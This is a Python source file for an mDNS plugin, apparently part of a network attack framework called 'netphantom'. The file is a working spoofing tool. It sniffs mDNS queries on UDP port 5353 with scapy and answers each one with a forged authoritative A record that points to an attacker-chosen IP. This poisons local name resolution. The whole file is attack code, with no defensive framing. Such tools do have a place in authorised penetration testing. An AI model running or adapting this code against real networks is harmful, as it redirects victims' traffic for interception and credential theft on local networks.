import asyncio
from typing import Any, Dict
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from netphantom.core.interfaces import ProtocolPlugin
from netphantom.utils.logger import logger

class MDNSPlugin(ProtocolPlugin):
    @property
    def name(self) -> str:
        return "mdns"

    async def setup(self, config: Dict[str, Any]) -> None:
        self.interface = config.get("interface", "eth0")
        self.spoof_ip = config.get("spoof_ip", "127.0.0.1")
        self.running = False

    async def start(self) -> None:
        self.running = True
        asyncio.create_task(self._run())

    async def stop(self) -> None:
        self.running = False
        logger.info("[mDNS] Plugin stopped.")

    async def _run(self) -> None:
        logger.info(f"[mDNS] Starting discovery on {self.interface}")
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, self._sniff_blocking)

    def _sniff_blocking(self):
        sniff(
            iface=self.interface, 
            filter="udp port 5353", 
            prn=self._handle_packet, 
            store=0, 
            stop_filter=lambda x: not self.running
        )

    def _handle_packet(self, packet: Packet):
        if DNS in packet and packet[DNS].qr == 0:
            query_name = packet[DNSQR].qname.decode().rstrip('.')
            logger.info(f"[mDNS] Intercepted query for {query_name} from {packet[IP].src}")
            
            resp = IP(dst="224.0.0.251", src=self.spoof_ip) / \
                   UDP(dport=5353, sport=5353) / \
                   DNS(id=0, qr=1, aa=1, rd=0, ra=0, z=0, rcode=0,
                       qd=packet[DNS].qd,
                       an=DNSRR(rrname=packet[DNSQR].qname, type='A', rdata=self.spoof_ip))
            
            send(resp, iface=self.interface, verbose=False)
            logger.info(f"[mDNS] Spoofed response sent to 224.0.0.251")

